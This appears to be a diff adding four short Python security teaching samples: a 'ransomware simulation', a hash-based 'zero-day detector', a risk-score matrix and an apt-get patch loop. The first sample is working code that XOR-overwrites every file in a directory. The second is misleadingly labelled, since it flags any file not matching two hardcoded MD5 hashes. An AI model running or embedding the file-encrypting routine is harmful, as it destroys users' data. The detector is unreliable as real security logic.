@@ -1,0 +1,124 @@
+Code Sample 1:-
+# Basic ransomware simulation (Python):
+	import os
+
+	def encrypt_files(directory): 
+	# Iterate over all files in the specified directory
+	
+	    for filename in os.listdir(directory):
+	        file_path = os.path.join(directory, filename) 
+	# Open the file in read-binary mode
+	
+	
+	        with open(file_path, 'rb') as file:
+	            data = file.read() 
+	# Convert the file data to a mutable bytearray
+	
+	        encrypted_data = bytearray(data) 
+	# Perform XOR encryption on each byte with the key 0xAA
+	
+	        for i in range(len(encrypted_data)):
+	            encrypted_data[i] ^= 0xAA  # XOR encryption
+	 # Write the encrypted data back to the file
+	
+	        with open(file_path, 'wb') as file:
+	            file.write(encrypted_data)
+	# Call the function to encrypt files in the specified directory
+	
+	encrypt_files('/path/to/your/files')
+
+
+Code Sample 2:-
+# Simulating a zero-day exploit detection (Python)
+
+	import hashlib
+	
+	def detect_zero_day_exploit(file_path):
+	    """
+	    Detects potential zero-day exploits by comparing file hashes to a known list.
+
+	    Args:
+	        file_path (str): The path to the file to be analyzed.
+	
+	    Returns:
+	        None
+	    """
+	
+	    # Define a list of known, benign file hashes
+	    known_hashes = ["d41d8cd98f00b204e9800998ecf8427e", "0cc175b9c0f1b6a831c399e269772661"]
+	
+	    # Calculate the MD5 hash of the file
+	    with open(file_path, "rb") as f:
+	        file_hash = hashlib.md5(f.read()).hexdigest()
+	
+	    # Check if the file hash is not in the known list
+	    if file_hash not in known_hashes:
+	        print(f"Zero-day exploit detected in file: {file_path}")
+	
+	# Example usage:
+	detect_zero_day_exploit("/path/to/suspicious/file")
+
+Code sample 3:-
+
+#Risk assessment matrix (Python)
+	def risk_assessment(vulnerabilities):
+	    """
+	    Assesses the risk of each vulnerability based on its impact and likelihood.
+	
+	    Args:
+	        vulnerabilities (list): A list of vulnerability dictionaries, each containing 'name', 'impact', and 'likelihood' keys.
+	
+	    Returns:
+	        None
+	    """
+	
+	    for vuln in vulnerabilities:
+	        # Extract impact and likelihood values from the vulnerability dictionary
+	        impact = vuln["impact"]
+	        likelihood = vuln["likelihood"]
+	
+	        # Calculate the risk score by multiplying impact and likelihood
+	        risk_score = impact * likelihood
+	
+	        # Print the vulnerability name and its calculated risk score
+	        print(f"Vulnerability: {vuln['name']}, Risk Score: {risk_score}")
+	
+	# Define a list of vulnerabilities, each with a name, impact, and likelihood
+	vulnerabilities = [
+	    {"name": "SQL Injection", "impact": 9, "likelihood": 8},
+	    {"name": "Cross-Site Scripting", "impact": 6, "likelihood": 7},
+	    {"name": "Buffer Overflow", "impact": 10, "likelihood": 5},
+	]
+	
+	# Call the risk_assessment function with the vulnerability list
+	risk_assessment(vulnerabilities)
+
+Code Sample 4:-
+
+#Automated Patch Management
+
+	import subprocess
+	
+	def apply_patches():
+	  """
+	  Applies a list of pre-defined security patches using the 'apt-get' command.
+	
+	  This function assumes the user has root privileges (sudo) and 
+	  that the patches are available in the package repositories.
+	
+	  This is a basic example and may not be suitable for all patching scenarios.
+	  """
+	
+	  # Define a list of patch names
+	  patches = ["patch1", "patch2", "patch3"]
+	
+	  # Loop through each patch name in the list
+	  for patch in patches:
+	    # Build the command to install the patch using 'apt-get'
+	    command = ["sudo", "apt-get", "install", patch]
+	
+	    # Execute the command using the subprocess module
+	    subprocess.run(command)
+	
+	# Call the apply_patches function to initiate patching
+	apply_patches()
